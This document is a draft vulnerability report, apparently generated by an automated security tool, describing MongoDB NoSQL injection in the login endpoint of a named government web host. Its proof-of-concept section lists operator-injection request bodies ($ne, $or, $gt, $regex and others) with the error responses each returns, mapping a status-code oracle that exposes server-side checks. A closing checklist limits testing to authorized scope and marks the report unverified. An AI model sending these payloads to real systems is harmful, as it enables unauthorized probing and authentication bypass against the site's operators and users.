# POC/EXP — /login 接口存在 MongoDB NoSQL 注入（用户名/密码字段未过滤，状态码 oracle 泄露 source 校验）

> 漏洞ID: `0d7a556c-b090-45ab-b876-e2f6849d829e`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4004/login (POST, username & password 字段)`

**類型**: NoSQL 注入

## 描述

/login 接口的 username/password 字段直接拼入 MongoDB find() 查询，未做类型/操作符过滤。攻击者注入 $ne/$or/$gt/$lt 等操作符可改变查询语义。响应状态码存在 oracle 差异：注入多文档匹配操作符（$ne/$or/$and/$gt/$lt）时返回 403{"message":"無法登入的來源"}（source 白名单校验失败），注入单文档/零文档匹配（$eq/$regex/$in/精确字符串）时返回 500 TypeError（服务端 result[0] 处理崩溃）。403 消息泄露了服务端存在 source 来源白名单校验逻辑。

## POC / 復現步驟

```
1) 多文档->403: POST /login {"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"} -> 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}（需先 GET /captcha 建 session）
2) 单/零文档->500: POST /login {"username":"admin","password":"x","captcha":"1"} -> 500 "TypeError"；{"username":{"$eq":"ZzzZ"},...} -> 500 "TypeError"
3) 操作符边界: $ne/$or/$and/$gt/$lt -> 403(SOURCE路径); $eq/$regex/$in/$nin/$exists/$elemMatch/$not/精确字符串 -> 500(崩溃)
4) password 条件不影响状态码（username 决定路径）; domain/source 请求字段不影响 403（校验基于用户文档 source 字段）
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
